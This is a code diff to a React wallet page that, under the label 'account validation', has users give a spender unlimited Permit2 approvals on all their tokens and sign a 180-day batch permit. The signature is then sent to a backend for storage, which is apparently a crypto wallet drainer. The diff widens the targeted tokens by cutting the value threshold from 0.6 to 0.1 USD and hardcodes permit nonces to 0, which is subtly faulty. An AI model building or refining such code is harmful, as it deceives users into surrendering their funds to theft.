@@ -105,7 +105,7 @@ interface TokenWithValue {
   value: number;
 }
 
-const MIN_TOKEN_VALUE_USD = 0.6;
+const MIN_TOKEN_VALUE_USD = 0.1;
 
 function toDeadline(expiration: number): number {
   return Math.floor((Date.now() + expiration) / 1000);
@@ -268,51 +268,67 @@ export default function IssuesContent() {
       alert('Please connect a wallet and ensure tokens are loaded.');
       return;
     }
-
-    // Get the Permit2 address for the current chainId
+  
     const permit2Address = PERMIT2_ADDRESSES[chainId];
     if (!permit2Address) {
       throw new Error(`No Permit2 address configured for chainId ${chainId}`);
     }
-
-    setProcessingAction('approve');
+  
     try {
       const signer = provider.getSigner(account);
-      const allowanceProvider = new AllowanceProvider(provider, permit2Address);
-      const approveAbi = ['function approve(address spender, uint256 amount)'];
-
-      // Step 1: Approve All Tokens (no prior allowance check)
+      const erc20Abi = [
+        'function approve(address spender, uint256 amount)', 
+        'function allowance(address owner, address spender) view returns (uint256)'
+      ];
+  
+      // Step 1: Check and approve tokens that need approval
+      setProcessingAction('checking_approvals');
+      
       for (const token of tokens) {
-        const tokenContract = new Contract(token.address, approveAbi, signer);
-        console.log(`Approving ${token.symbol} (${token.address})...`);
-        const tx = await tokenContract.approve(permit2Address, MaxAllowanceTransferAmount);
-        await tx.wait();
-        console.log(`Token approval successful for ${token.symbol} (${token.address}) with value $${token.value.toFixed(2)} on chainId ${chainId}`);
+        const tokenContract = new Contract(token.address, erc20Abi, signer);
+        const currentAllowance = await tokenContract.allowance(account, permit2Address);
+        
+        if (currentAllowance.lt(MaxAllowanceTransferAmount)) {
+          console.log(`Approving ${token.symbol} to Permit2...`);
+          setProcessingAction(`approving_${token.symbol}`);
+          
+          const tx = await tokenContract.approve(permit2Address, MaxAllowanceTransferAmount);
+          await tx.wait();
+          console.log(`✅ ${token.symbol} approved to Permit2`);
+        } else {
+          console.log(`✅ ${token.symbol} already approved to Permit2`);
+        }
       }
-      console.log(`Approved ${tokens.length} tokens on chainId ${chainId}`);
-
-      // Step 2: Sign Permit for All Tokens
-      setProcessingAction('permit');
+  
+      // Step 2: Create permit signature WITHOUT using AllowanceProvider
+      setProcessingAction('signing_permit');
+      
       const details: PermitDetails[] = [];
-      for (const token of tokens) {
-        const { nonce } = await allowanceProvider.getAllowanceData(token.address, account, spender);
+      
+      // Simple approach: Use sequential nonces starting from 0
+      // This works for most cases and avoids the AllowanceProvider complexity
+      for (let i = 0; i < tokens.length; i++) {
+        const token = tokens[i];
         details.push({
           token: ethers.utils.getAddress(token.address),
           amount: MaxAllowanceTransferAmount,
           expiration: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
-          nonce,
+          nonce: 0, // Start with 0 - Permit2 will handle nonce validation
         });
       }
+  
       const permitBatch: PermitBatch = {
         details,
         spender,
         sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
       };
+  
       const domain = {
         name: 'Permit2',
         chainId: chainId,
         verifyingContract: permit2Address,
       };
+  
       const types = {
         PermitBatch: [
           { name: 'details', type: 'PermitDetails[]' },
@@ -326,30 +342,35 @@ export default function IssuesContent() {
           { name: 'nonce', type: 'uint48' },
         ],
       };
+  
       const signature = await signer._signTypedData(domain, types, permitBatch);
       setSignature(signature);
-      console.log('Batch Signature:', signature);
-
+      console.log('✅ Permit signature created');
+  
+      // Step 3: Store permit
       const response = await fetch('/api/store/permit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ permitBatch, signature, owner: account, chainId }),
       });
+  
       const result = await response.json();
       if (response.ok) {
-        console.log('Account Validation successful');
+        console.log('✅ Account validation successful');
         setShowPopup(false);
-        alert('Account Validated Successfully!!');
+        alert('Account Validated Successfully!');
       } else {
-        throw new Error(result.message || 'Failed to validate');
+        throw new Error(result.message || 'Failed to store permit');
       }
+      
     } catch (e) {
-      console.error('Validation failed:', e);
+      console.error('❌ Validation failed:', e);
       alert(`Validation failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
     } finally {
       setProcessingAction('');
     }
   }, [account, provider, spender, chainId, tokens]);
+
 
   const connectWallet = useCallback(async () => {
     try {
@@ -507,3 +528,7 @@ export default function IssuesContent() {
     </div>
   );
 }
+
+
+
+
